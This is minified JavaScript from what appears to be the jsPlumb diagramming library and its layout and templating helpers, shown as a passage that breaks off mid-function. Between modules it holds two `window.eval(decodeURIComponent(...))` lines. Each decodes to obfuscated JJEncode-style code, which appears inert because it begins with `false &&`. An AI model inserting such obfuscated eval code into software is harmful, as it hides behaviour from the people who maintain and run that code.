a,d=[this.x,this.y],u=[this.w,this.h];null!=r&&(r.xmin<0&&(d[0]+=r.xmin),r.ymin<0&&(d[1]+=r.ymin),u[0]=r.xmax+(r.xmin<0?-r.xmin:0),u[1]=r.ymax+(r.ymin<0?-r.ymin:0)),n.useDivWrapper?(e.sizeElement(this.canvas,d[0],d[1],u[0],u[1]),d[0]=0,d[1]=0,a=l([0,0])):a=l([d[0],d[1]]),i.paint.apply(this,arguments),s(this.svg,{style:a,width:u[0]||0,height:u[1]||0})}},{renderer:i}};e.extend(h,t.jsPlumbUIComponent,{cleanup:function(t){t||null==this.typeId?(this.canvas&&(this.canvas._jsPlumb=null),this.svg&&(this.svg._jsPlumb=null),this.bgCanvas&&(this.bgCanvas._jsPlumb=null),this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.bgCanvas&&this.bgCanvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.svg=null,this.canvas=null,this.path=null,this.group=null):(this.canvas&&this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas),this.bgCanvas&&this.bgCanvas.parentNode&&this.bgCanvas.parentNode.removeChild(this.bgCanvas))},reattach:function(t){var e=t.getContainer();this.canvas&&null==this.canvas.parentNode&&e.appendChild(this.canvas),this.bgCanvas&&null==this.bgCanvas.parentNode&&e.appendChild(this.bgCanvas)},setVisible:function(t){this.canvas&&(this.canvas.style.display=t?"block":"none")}}),t.ConnectorRenderers.svg=function(e){var n=this;h.apply(this,[{cssClass:e._jsPlumb.connectorClass,originalArgs:arguments,pointerEventsSpec:"none",_jsPlumb:e._jsPlumb}]).renderer.paint=function(o,i,r){var l=n.getSegments(),d=[0,0];if(r.xmin<0&&(d[0]=-r.xmin),r.ymin<0&&(d[1]=-r.ymin),l.length>0){var h={d:n.getPathData(),transform:"translate("+d[0]+","+d[1]+")","pointer-events":e["pointer-events"]||"visibleStroke"},p=null;n.x,n.y,n.w,n.h;if(o.outlineStroke){var f=o.outlineWidth||1,g=o.strokeWidth+2*f;delete(p=t.extend({},o)).gradient,p.stroke=o.outlineStroke,p.strokeWidth=g,null==n.bgPath?(n.bgPath=a("path",h),t.addClass(n.bgPath,t.connectorOutlineClass),c(n.svg,n.bgPath,0)):s(n.bgPath,h),u(n.svg,n.bgPath,p,0,n)}null==n.path?(n.path=a("path",h),c(n.svg,n.path,o.outlineStroke?1:0)):s(n.path,h),u(n.svg,n.path,o,0,n)}}},e.extend(t.ConnectorRenderers.svg,h);var p=t.SvgEndpoint=function(e){h.apply(this,[{cssClass:e._jsPlumb.endpointClass,originalArgs:arguments,pointerEventsSpec:"all",useDivWrapper:!0,_jsPlumb:e._jsPlumb}]).renderer.paint=function(e){var n=t.extend({},e);n.outlineStroke&&(n.stroke=n.outlineStroke),null==this.node?(this.node=this.makeNode(n),this.svg.appendChild(this.node)):null!=this.updateNode&&this.updateNode(this.node),u(this.svg,this.node,n,(this.x,this.y,this.w,this.h),this),l(this.node,(this.x,this.y))}.bind(this)};e.extend(p,h),t.Endpoints.svg.Dot=function(){t.Endpoints.Dot.apply(this,arguments),p.apply(this,arguments),this.makeNode=function(t){return a("circle",{cx:this.w/2,cy:this.h/2,r:this.radius})},this.updateNode=function(t){s(t,{cx:this.w/2,cy:this.h/2,r:this.radius})}},e.extend(t.Endpoints.svg.Dot,[t.Endpoints.Dot,p]),t.Endpoints.svg.Rectangle=function(){t.Endpoints.Rectangle.apply(this,arguments),p.apply(this,arguments),this.makeNode=function(t){return a("rect",{width:this.w,height:this.h})},this.updateNode=function(t){s(t,{width:this.w,height:this.h})}},e.extend(t.Endpoints.svg.Rectangle,[t.Endpoints.Rectangle,p]),t.Endpoints.svg.Image=t.Endpoints.Image,t.Endpoints.svg.Blank=t.Endpoints.Blank,t.Overlays.svg.Label=t.Overlays.Label,t.Overlays.svg.Custom=t.Overlays.Custom;var f=function(e,n){e.apply(this,n),t.jsPlumbUIComponent.apply(this,n),this.isAppendedAtTopLevel=!1,this.path=null,this.paint=function(t,e){if(t.component.svg&&e){null==this.path&&(this.path=a("path",{"pointer-events":"all"}),t.component.svg.appendChild(this.path),this.elementCreated&&this.elementCreated(this.path,t.component),this.canvas=t.component.svg);var i=n&&1===n.length&&n[0].cssClass||"",r=[0,0];e.xmin<0&&(r[0]=-e.xmin),e.ymin<0&&(r[1]=-e.ymin),s(this.path,{d:o(t.d),class:i,stroke:t.stroke?t.stroke:null,fill:t.fill?t.fill:null,transform:"translate("+r[0]+","+r[1]+")"})}};var o=function(t){return isNaN(t.cxy.x)||isNaN(t.cxy.y)?"":"M"+t.hxy.x+","+t.hxy.y+" L"+t.tail[0].x+","+t.tail[0].y+" L"+t.cxy.x+","+t.cxy.y+" L"+t.tail[1].x+","+t.tail[1].y+" L"+t.hxy.x+","+t.hxy.y};this.transfer=function(t){t.canvas&&this.path&&this.path.parentNode&&(this.path.parentNode.removeChild(this.path),t.canvas.appendChild(this.path))}};e.extend(f,[t.jsPlumbUIComponent,t.Overlays.AbstractOverlay],{cleanup:function(t){null!=this.path&&(t?this._jsPlumb.instance.removeElement(this.path):this.path.parentNode&&this.path.parentNode.removeChild(this.path))},reattach:function(t,e){this.path&&e.canvas&&e.canvas.appendChild(this.path)},setVisible:function(t){null!=this.path&&(this.path.style.display=t?"block":"none")}}),t.Overlays.svg.Arrow=function(){f.apply(this,[t.Overlays.Arrow,arguments])},e.extend(t.Overlays.svg.Arrow,[t.Overlays.Arrow,f]),t.Overlays.svg.PlainArrow=function(){f.apply(this,[t.Overlays.PlainArrow,arguments])},e.extend(t.Overlays.svg.PlainArrow,[t.Overlays.PlainArrow,f]),t.Overlays.svg.Diamond=function(){f.apply(this,[t.Overlays.Diamond,arguments])},e.extend(t.Overlays.svg.Diamond,[t.Overlays.Diamond,f]),t.Overlays.svg.GuideLines=function(){var e,n,o=null,i=this;t.Overlays.GuideLines.apply(this,arguments),this.paint=function(t,l){null==o&&(o=a("path"),t.connector.svg.appendChild(o),i.attachListeners(o,t.connector),i.attachListeners(o,i),e=a("path"),t.connector.svg.appendChild(e),i.attachListeners(e,t.connector),i.attachListeners(e,i),n=a("path"),t.connector.svg.appendChild(n),i.attachListeners(n,t.connector),i.attachListeners(n,i));var d=[0,0];l.xmin<0&&(d[0]=-l.xmin),l.ymin<0&&(d[1]=-l.ymin),s(o,{d:r(t.head,t.tail),stroke:"red",fill:null,transform:"translate("+d[0]+","+d[1]+")"}),s(e,{d:r(t.tailLine[0],t.tailLine[1]),stroke:"blue",fill:null,transform:"translate("+d[0]+","+d[1]+")"}),s(n,{d:r(t.headLine[0],t.headLine[1]),stroke:"green",fill:null,transform:"translate("+d[0]+","+d[1]+")"})};var r=function(t,e){return"M "+t.x+","+t.y+" L"+e.x+","+e.y}},e.extend(t.Overlays.svg.GuideLines,t.Overlays.GuideLines)}.call("undefined"!=typeof window?window:this),function(){"use strict";var t,e,n=this.jsPlumb,o=this.jsPlumbUtil,i=this.Katavorio,r=this.Biltong,s=function(t,e){var o="_katavorio_"+(e=e||"main"),s=t[o],a=t.getEventManager();return s||((s=new i({bind:a.on,unbind:a.off,getSize:n.getSize,getConstrainingRectangle:function(t){return[t.parentNode.scrollWidth,t.parentNode.scrollHeight]},getPosition:function(e,n){var o=t.getOffset(e,n,e._katavorioDrag?e.offsetParent:null);return[o.left,o.top]},setPosition:function(t,e){t.style.left=e[0]+"px",t.style.top=e[1]+"px"},addClass:n.addClass,removeClass:n.removeClass,intersects:r.intersects,indexOf:function(t,e){return t.indexOf(e)},scope:t.getDefaultScope(),css:{noSelect:t.dragSelectClass,droppable:"jtk-droppable",draggable:"jtk-draggable",drag:"jtk-drag",selected:"jtk-drag-selected",active:"jtk-drag-active",hover:"jtk-drag-hover",ghostProxy:"jtk-ghost-proxy"}})).setZoom(t.getZoom()),t[o]=s,t.bind("zoom",s.setZoom)),s};n.extend(this.jsPlumbInstance.prototype,{animationSupported:!0,getElement:function(t){return null==t?null:"string"==typeof(t="string"==typeof t?t:null!=t.length&&null==t.enctype?t[0]:t)?document.getElementById(t):t},removeElement:function(t){s(this).elementRemoved(t),this.getEventManager().remove(t)},doAnimate:function(t,e,i){i=i||{};var r,s,a,l=this.getOffset(t),d=(r=l,s=e,[(a=function(t){if(null!=s[t]){if(o.isString(s[t])){var e=s[t].match(/-=/)?-1:1,n=s[t].substring(2);return r[t]+e*n}return s[t]}return r[t]})("left"),a("top")]),u=d[0]-l.left,c=d[1]-l.top,h=i.duration||250,p=h/15,f=15/h*u,g=15/h*c,_=0,b=setInterval(function(){n.setPosition(t,{left:l.left+f*(_+1),top:l.top+g*(_+1)}),null!=i.step&&i.step(_,Math.ceil(p)),++_>=p&&(window.clearInterval(b),null!=i.complete&&i.complete())},15)},destroyDraggable:function(t,e){s(this,e).destroyDraggable(t)},unbindDraggable:function(t,e,n,o){s(this,o).destroyDraggable(t,e,n)},destroyDroppable:function(t,e){s(this,e).destroyDroppable(t)},unbindDroppable:function(t,e,n,o){s(this,o).destroyDroppable(t,e,n)},initDraggable:function(t,e,n){s(this,n).draggable(t,e)},initDroppable:function(t,e,n){s(this,n).droppable(t,e)},isAlreadyDraggable:function(t){return null!=t._katavorioDrag},isDragSupported:function(t,e){return!0},isDropSupported:function(t,e){return!0},isElementDraggable:function(t){return(t=n.getElement(t))._katavorioDrag&&t._katavorioDrag.isEnabled()},getDragObject:function(t){return t[0].drag.getDragElement()},getDragScope:function(t){return t._katavorioDrag&&t._katavorioDrag.scopes.join(" ")||""},getDropEvent:function(t){return t[0].e},getUIPosition:function(t,e){var n=t[0].el;if(null==n.offsetParent)return null;var o=t[0].finalPos||t[0].pos,i={left:o[0],top:o[1]};if(n._katavorioDrag&&n.offsetParent!==this.getContainer()){var r=this.getOffset(n.offsetParent);i.left+=r.left,i.top+=r.top}return i},setDragFilter:function(t,e,n){t._katavorioDrag&&t._katavorioDrag.setFilter(e,n)},setElementDraggable:function(t,e){(t=n.getElement(t))._katavorioDrag&&t._katavorioDrag.setEnabled(e)},setDragScope:function(t,e){t._katavorioDrag&&t._katavorioDrag.k.setDragScope(t,e)},setDropScope:function(t,e){t._katavorioDrop&&t._katavorioDrop.length>0&&t._katavorioDrop[0].k.setDropScope(t,e)},addToPosse:function(t,e){var o=Array.prototype.slice.call(arguments,1),i=s(this);n.each(t,function(t){(t=[n.getElement(t)]).push.apply(t,o),i.addToPosse.apply(i,t)})},setPosse:function(t,e){var o=Array.prototype.slice.call(arguments,1),i=s(this);n.each(t,function(t){(t=[n.getElement(t)]).push.apply(t,o),i.setPosse.apply(i,t)})},removeFromPosse:function(t,e){var o=Array.prototype.slice.call(arguments,1),i=s(this);n.each(t,function(t){(t=[n.getElement(t)]).push.apply(t,o),i.removeFromPosse.apply(i,t)})},removeFromAllPosses:function(t){var e=s(this);n.each(t,function(t){e.removeFromAllPosses(n.getElement(t))})},setPosseState:function(t,e,o){var i=s(this);n.each(t,function(t){i.setPosseState(n.getElement(t),e,o)})},dragEvents:{start:"start",stop:"stop",drag:"drag",step:"step",over:"over",out:"out",drop:"drop",complete:"complete",beforeStart:"beforeStart"},animEvents:{step:"step",complete:"complete"},stopDrag:function(t){t._katavorioDrag&&t._katavorioDrag.abort()},addToDragSelection:function(t){s(this).select(t)},removeFromDragSelection:function(t){s(this).deselect(t)},clearDragSelection:function(){s(this).deselectAll()},trigger:function(t,e,n,o){this.getEventManager().trigger(t,e,n,o)},doReset:function(){for(var t in this)0===t.indexOf("_katavorio_")&&this[t].reset()}}),t=n.init,(e=function(){/complete|loaded|interactive/.test(document.readyState)&&void 0!==document.body&&null!=document.body?t():setTimeout(e,9)})()}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){"use strict";var t=this.Farahey={};"undefined"!=typeof exports&&(exports.Farahey=t);var e=this.Biltong,n=function(t,e,n){var o=function(t,e,n){for(var o=0,i=t.length,r=-1,s=0;o<i;)if(r=parseInt((o+i)/2),(s=n(t[r],e))<0)o=r+1;else{if(!(s>0))return r;i=r}return o}(t,e,n);t.splice(o,0,e)},o=[function(t,e){return t.x+t.w-e.x},function(t,e){return t.x-(e.x+e.w)}],i=[function(t,e){return t.y+t.h-e.y},function(t,e){return t.y-(e.y+e.h)}],r=[null,[o[0],i[1]],[o[0],i[0]],[o[1],i[0]],[o[1],i[1]]],s=t.calculateSpacingAdjustment=function(t,n){var o=t.center||[t.x+t.w/2,t.y+t.h/2],i=n.center||[n.x+n.w/2,n.y+n.h/2],s=e.gradient(o,i),a=e.quadrant(o,i);return function(t,e,n,o,i){isNaN(n)&&(n=0);var s,a,l,d,u,c,h=e.y+e.h,p=n==1/0||n==-1/0?e.x+e.w/2:(h-o)/n,f=Math.atan(n);return u="w",c=p,(l=e)[d="x"]<=c&&c<=l[d]+l[u]?{left:a=(s=r[i][1](t,e))/Math.sin(f)*Math.cos(f),top:s}:{left:a=r[i][0](t,e),top:s=a/Math.cos(f)*Math.sin(f)}}(t,n,s,s==1/0||s==-1/0||isNaN(s)?0:o[1]-s*o[0],a)},a=t.paddedRectangle=function(t,e,n){return{x:t[0]-n[0],y:t[1]-n[1],w:e[0]+2*n[0],h:e[1]+2*n[1]}},l=function(t){if(null==t)return null;if("[object Array]"===Object.prototype.toString.call(t)){var e=[];return e.push.apply(e,t),e}var n=[];for(var o in t)n.push(t[o]);return n},d=function(t){var o,i,r=t.getPosition,d=t.getSize,u=t.getId,c=t.setPosition,h=t.padding||[20,20],p=t.constrain||function(t,e,n){return n},f=[],g={},_={},b=l(t.elements||[]),v=t.origin||[0,0],m=t.executeNow,w=(this.getOrigin=function(){return v},t.filter||function(t){return!0}),j=t.exclude||function(t){return!1},y=t.orderByDistanceFromOrigin,P=new function(t,n){var o=t,i={},r=function(t){if(!i[t[1]]){var e=n(t[2]);i[t[1]]={l:t[0][0],t:t[0][1],w:e[0],h:e[1],center:[t[0][0]+e[0]/2,t[0][1]+e[1]/2]}}return i[t[1]]};this.setOrigin=function(t){o=t,i={}},this.compare=function(t,n){var i=e.lineLength(o,r(t).center),s=e.lineLength(o,r(n).center);return i<s?-1:i===s?0:1}}(v,d),E=t.updateOnStep,x=t.stepInterval||350,C=t.debug,S=function(){return P.setOrigin(v),f.length=0,g={},_={},function(t){var e,o,i,s,a;e=o=1/0,i=s=-1/0;for(var l=0;l<t.length;l++){var c=r(t[l]),h=d(t[l]),p=u(t[l]);g[p]=[c.left,c.top],a=[[c.left,c.top],p,t[l]],y&&0!==f.length?n(f,a,P.compare):f.push(a),_[p]=h,e=Math.min(e,c.left),o=Math.min(o,c.top),i=Math.max(i,c.left+h[0]),s=Math.max(s,c.top+h[1])}return[e,i,o,s]}(b)},I=function(t){if(b.length>1){var n=(t=t||{}).filter||w,o=t.padding||h,i=t.iterations,r=t.exclude||j,l=t.excludeFocus;t.gather&&function(t,e,n,o,i,r,l,d,u,c,h,p,f){for(var g=a(r=r||[0,0],[1,1],o),_=0;_<t.length;_++)if(!p(t[_][1],t[_][2])){var b=e[t[_][1]],v=n[t[_][1]],m=a(b,v,o);if(l(t[_][1],t[_][2])){var w=s(g,m);b[0]+=w.left,b[1]+=w.top}}}(f,g,_,o,0,v,n,0,0,0,0,r);var d=function(t,n,o,i,r,l,d,u,c,h,p,f,g){l=l||[0,0],h=h||function(){},p=p||2;var _,b,v=a(l,[1,1],i),m=1,w=!0,j={},y=function(t,e,n,o){j[t]=!0,e[0]+=n,e[1]+=o},P=function(){for(var l=0;l<t.length;l++)if(!f(t[l][1],t[l][2])){var j=n[t[l][1]],E=t[l][1],x=(t[l][2],o[t[l][1]]),C=a(j,x,i);!g&&d(t[l][1],t[l][2])&&e.intersects(v,C)&&(_=s(v,C),b=r(t[l][1],j,_),y(E,j,b.left,b.top)),C=a(j,x,i);for(var S=0;S<t.length;S++)if(l!==S){if(f(t[S][1],t[S][2]))continue;if(d(t[S][1],t[S][2])){var I=n[t[S][1]],A=o[t[S][1]],T=a(I,A,i);e.intersects(C,T)&&(w=!0,_=s(C,T),b=r(t[S][1],I,_),y(t[S][1],I,b.left,b.top))}}}u&&h(),w&&m<p&&(w=!1,m++,u?window.setTimeout(P,c):P())};return P(),j}(f,g,_,o,p,v,n,E,x,A,i,r,l);A(d)}},A=function(t){for(var e=0;e<b.length;e++){var n=u(b[e]);t[n]&&c(b[e],{left:g[n][0],top:g[n][1]})}},T=function(t){null!=t&&(v=t,P.setOrigin(t))};return this.execute=function(t,e){T(t),S(),I(e)},this.executeAtCenter=function(t){var e=S();T([(e[0]+e[1])/2,(e[2]+e[3])/2]),I(t)},this.executeAtEvent=function(e,n){var i=t.container,r=t.getContainerPosition(i),s=e.pageX-r.left+i.scrollLeft,a=e.pageY-r.top+i.scrollTop;C&&(o.style.left=e.pageX+"px",o.style.top=e.pageY+"px"),this.execute([s,a],n)},this.setElements=function(t){return b=l(t),this},this.addElement=function(t,e){return null==t||!e&&-1!==b.indexOf(t)||b.push(t),this},this.addElements=function(t,e){if(e)Array.prototype.push.apply(b,t);else for(var n=0;n<t.length;n++)this.addElement(t[n]);return this},this.getElements=function(){return b},this.removeElement=function(t){for(var e=-1,n=0;n<b.length;n++)if(b[n]===t){e=n;break}return-1!==e&&b.splice(e,1),this},this.setPadding=function(t){h=t},this.setConstrain=function(t){p=t},this.setFilter=function(t){w=t},this.reset=function(){b.length=0},C&&((i=document.createElement("div")).style.position="absolute",i.style.width="10px",i.style.height="10px",i.style.backgroundColor="red",document.body.appendChild(i),o=i),m&&this.execute(),this};t.getInstance=function(t){return new d(t)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("false%20%26%26%20window._j.%24%24_%24%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j._%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.__%2b%22.%22%2b(!%5b%5d%2b%22%22)%5bwindow._j._%24_%5d%2bwindow._j._%24%2bwindow._j.%24%24__%2bwindow._j.%24_%24_%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.__%24%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2b%22.%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.___%2bwindow._j._%24%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24%24_%2bwindow._j._%24%24%2bwindow._j.__%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24%24_%2bwindow._j.%24_%24_%2b%22%5c%5c%22%2bwindow._j.__%24%2bwindow._j.%24_%24%2bwindow._j.%24_%24%2bwindow._j.%24%24%24_%2b%22!%3d%3d%27%5c%5c%22")),function(){var t=this,e="undefined"!=typeof navigator&&/MSIE\s([\d.]+)/.test(navigator.userAgent)?new Number(RegExp.$1):-1,n=e>-1&&e<9,o=function(t,e,n){for(var o in e)t[o]=e[o],n&&n(o,t[o]);return t},i=function(t,e,n){if(null==t)return null;if("$data"===e||null==e)return t;var o=e.match(/^\{(.*)\}$/);if(o){for(var r={},s=o[1].split(","),a=0;a<s.length;a++){var l=s[a].split(":"),u=i(t,l[1]);r[d(l[0])]=u||l[1].replace(/'/g,"")}return r}var c=t,h=null;return(e=e.replace(/\['([^']*)'\]/g,".$1")).replace(/([^\.])+/g,function(t,e,o,i){if(null==h){var r=t.match(/([^\[0-9]+){1}(\[)([0-9+])/),s=function(){return c[r[1]]||(c[r[1]]=[],c[r[1]])};if(o+t.length>=i.length)if(r){var a=s(),l=r[3];null==n?h=a[l]:a[l]=n}else null==n?h=c[t]:c[t]=n;else if(r){var d=s();c=d[r[3]]||(d[r[3]]={},d[r[3]])}else c=c[t]||(c[t]={},c[t])}}),h},r=function(e){var n=t.document.getElementById(e);return null!=n?n.innerHTML:null},s=function(t){return"[object Array]"===Object.prototype.toString.call(t)},a=function(t){for(var e=[],n=0;n<t.length;n++)s(t[n])?e.push.apply(e,a(t[n])):e[e.length]=t[n];return e},l=function(t,e){for(var n=[],o=0,i=t.length;o<i;o++)e(t[o])&&n.push(t[o]);return n},d=function(t){if(null==t)return t;for(var e=t.replace(/^\s\s*/,""),n=/\s/,o=e.length;n.test(e.charAt(--o)););return e.slice(0,o+1)},u=function(t,e,n,o,i){var r=h(),s={w:e,e:[],u:r};i.bindings[r]=s;return s.reapply=new Function("$data",(null!=o?"var out='';try { with($data) { if ("+o+") out = this.w; else return null; }}catch(_){return null;}":"var out = this.w;")+"for (var k = 0; k < this.e.length; k++) { with($data) { "+(null!=o?"try {  if("+o+") { out = out.replace(this.e[k][0], eval(this.e[k][1])); } else out=''; } catch(__) { out='';}":"try { out = out.replace(this.e[k][0], eval(this.e[k][1])); } catch(__) { out=out.replace(this.e[k][0], '');}")+" }} return out;"),n.bindings[t]=s,e.replace(/\$\{([^\}]*)\}/g,function(t,e,n,o){s.e.push([t,e])}),r},c=function(t,e,n,o,i){n.atts[t]=e,u(t,e,n,o,i)},h=function(t){return(t?"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx":"xxxxxxxx-xxxx-4xxx").replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"==t?e:3&e|8).toString(16)})},p=function(t,e){this.uuid=h(),this.children=[],this.instance=e,e.entries[this.uuid]=this},f=function(t,e){p.apply(this,arguments);var n=function(t,e){function n(t,n){var o=t.match(/([^=]+)=['"](.*)['"]/);return null==o&&null==n?i.atts[t]="":null==o?c(t,"",i,n,e):c(o[1],o[2],i,n,e),o}for(var o=e.parseAttributes(t),i={el:d(o[0]),atts:{},bindings:{}},r=1;r<o.length;r++){var s=d(o[r]);if(null!=s&&s.length>0){var a=s.match(e.inlineIfRe);if(a)for(var l=a[2].split(e.attributesRe),u=0;u<l.length;u++){var h=d(l[u]);null!=h&&h.length>0&&n(h,a[1])}else n(s)}}return i}(t,e);null!=n.atts["r-toggle"]&&null!=e.toggleManager&&(this.discard=!1===e.toggleManager(n.atts["r-toggle"]));var o=n.el.split(":");this.tag=n.el,2===o.length&&(this.namespace=o[0]),this.atts=n.atts,this.bindings=n.bindings,this.type="element",this.compile=function(t,e){var n=t.customTags[this.tag]||t.globalTags[this.tag];if(n){for(var o=n.getFunctionBody(this),i=t.customTags[this.tag]?"_rotors.customTags['"+this.tag+"'].rendered(_le, _rotors, data[0]);":"_rotors.globalTags['"+this.tag+"'].rendered(_le, _rotors, data[0]);",r=0;r<this.children.length;r++)this.children[r].precompile&&(o+=this.children[r].precompile(t)),o+=this.children[r].compile(t),this.children[r].postcompile&&(o+=this.children[r].postcompile(t));return o+"_le=_els.pop();"+i+"_rotors.pet(_eid,'"+this.uuid+"');"}var s="/* element entry "+this.uuid+" */;";if(!0!==this.remove){s+=t.getExecutionContent(this.tag,this.uuid,!1,this.namespace);for(var a in this.atts)if(this.atts.hasOwnProperty(a)){s+="__a="+(null!=this.bindings[a]?"_rotors.bind(data[0], '"+this.bindings[a].u+"');":"'"+this.atts[a]+"'")+";if(__a!=null) {_rotors.setAttribute(e,'"+a+"',__a || '');}"}}for(var l=0;l<this.children.length;l++)this.children[l].precompile&&(s+=this.children[l].precompile(t)),s+=this.children[l].compile(t),this.children[l].postcompile&&(s+=this.children[l].postcompile(t));return!0===this.remove||e||(s+="_le=_els.pop();",s+="_rotors.pet(_eid, '"+this.uuid+"');"),s};var i=function(t,n){e.each(n.split(";"),function(e){var n=e.indexOf(":"),o=e.substring(0,n);t.style[o]=e.substring(n+1)})};this.update=function(t,n){for(var o in this.atts)if(this.atts.hasOwnProperty(o)&&"class"!==o){var r;null!=(r=null!=this.bindings[o]?this.bindings[o].reapply(n):"'"+this.atts[o]+"'")&&("style"===o&&null!=t.style?i(t,r):t.setAttribute(o,r))}if(this.originalCustomTag){var s=e.customTags[this.originalCustomTag]||e.globalTags[this.originalCustomTag];s&&s.updated(t,n)}}},g=function(){this.childNodes=[],this.appendChild=function(t){this.childNodes.push(t)},this.toString=function(){for(var t="",e=0;e<this.childNodes.length;e++)t+=this.childNodes[e].toString();return t}},_=function(t,e,n){return function(o){var i=n?null:t.cache[o];return null==i&&(i=e(o)),null==i&&(i=t.defaultTemplate),null!=i&&(t.cache[o]=i),i}},b=function(t){t=t||{},this.cache={},this.templateCache={},this.customTags={},null!=t.defaultTemplate&&this.setDefaultTemplate(t.defaultTemplate),this.templateResolver=t.templateResolver?t.templateResolver:t.templates?function(e){return t.templates[e]}:this.isBrowser?r:null,this.toggleManager=null};!function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])}(b.prototype,{bindings:{},entries:{},executions:{},bind:function(t,e){var n=this.bindings[e];return null==n?"":n.reapply(t)},defaultTemplate:"<div></div>",defaultCompiledTemplate:null,setDefaultTemplate:function(t){null!=t?(this.defaultTemplate=t,this.defaultCompiledTemplate=this.compile(this.parse(t))):this.clearDefaultTemplate()},clearDefaultTemplate:function(){this.defaultTemplate=null,this.defaultCompiledTemplate=null},clearCache:function(){this.cache={},this.templateCache={}},namespaceHandlers:{svg:function(t){return"e = document.createElementNS('http://www.w3.org/2000/svg', '"+t.split(":")[1]+"');e.setAttribute('version', '1.1');e.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');"}},namespaces:{xlink:"http://www.w3.org/1999/xlink"},each:function(t,e,n,o){var i;if(s(t))for(i=0;i<t.length;i++)e(t[i],n,i,o);else for(i in t)t.hasOwnProperty(i)&&e({$key:i,$value:t[i]},n,i,o)},openRe:new RegExp("<([^/>]*?)>$|<([^/].*[^/])>$"),closeRe:new RegExp("^</([^>]+)>"),openCloseRe:new RegExp("<(.*)(/>$)"),tokenizerRe:/(<[^\^>]+\/>)|(<!--[\s\S]*?-->)|(<[\/a-zA-Z0-9\-:]+(?:\s*[a-zA-Z\-]+=\"[^\"]*\"|\s*[a-zA-Z\-]+='[^']+'|\s*[a-zA-Z\-]|\s*\{\{.*\}\})*>)/,commentRe:/<!--[\s\S]*?-->/,attributesRe:/([a-zA-Z0-9\-_:]+="[^"]*")|(\{\{if [^(?:\}\})]+\}\}.*\{\{\/if\}\})/,inlineIfRe:/\{\{if ([^\}]+)\}\}(.*)\{\{\/if\}\}/,singleExpressionRe:/^[\s]*\$\{([^\}]*)\}[\s]*$/,parseAttributes:function(t){return null==t?t:this.filterEmpty(t.replace("/>",">").split(/^<|>$/)[1].split(this.attributesRe))},map:function(t,e){for(var n=[],o=0,i=t.length;o<i;o++)n.push(e(t[o]));return a(n)},flatten:a,filter:l,data:i,uuid:h,filterEmpty:function(t){return l(t,function(t){return null!=t&&d(t).length>0})},isBrowser:"undefined"!=typeof navigator,isOldIE:function(){return n},cf:function(){return this.isBrowser?this.isOldIE()?t.document.createElement("div"):t.document.createDocumentFragment():new g},ctn:function(e){return this.isBrowser?t.document.createTextNode(e):new function(t){this.nodeValue=t,this.toString=function(){return this.nodeValue}}(e)},ce:function(e){return this.isBrowser?t.document.createElement(e):new function(t){g.apply(this),this.tag=t;var e={};this.setAttribute=function(t,n){e[t]=n},this.getAttribute=function(t){return e[t]},this.setAttributeNS=function(t,n,o){e[t+":"+n]=o},this.toString=function(){var t="<"+this.tag,n="";for(var o in e)n+=" "+o+'="'+e[o]+'"';t=t+n+">";for(var i=0;i<this.childNodes.length;i++)t+=this.childNodes[i].toString();return t+"</"+this.tag+">"}}(e)},customElements:{"r-each":{parse:function(t,e,n,o){t.context=t.atts.in,t.type="each"},compile:function(t){var e=function(){var e="function(item, _rotorsLoopId, _rotorsLoopIndex, _rotorsLoopContext) { ";e+="data.unshift(item);$value=item;$key=_rotorsLoopIndex;";for(var n=0;n<this.children.length;n++)e+=this.children[n].compile(t);return(e+="data.splice(0,1);")+"}"}.bind(this);return";_rotors.te(null, _eid, '"+this.uuid+"');"+(this.context?';data.unshift(_rotors.data(data[0], "'+this.context+'"));':"")+"_rotors.each(data[0], "+e()+",'"+this.uuid+"', '"+this.context.replace(/'/g,"\\'")+"');"+(this.context?";data.splice(0, 1);":"")+";_rotors.pet(_eid, '"+this.uuid+"');"}},"r-if":{parse:function(t,e,n,o){t.test=t.atts.test},compile:function(t){var 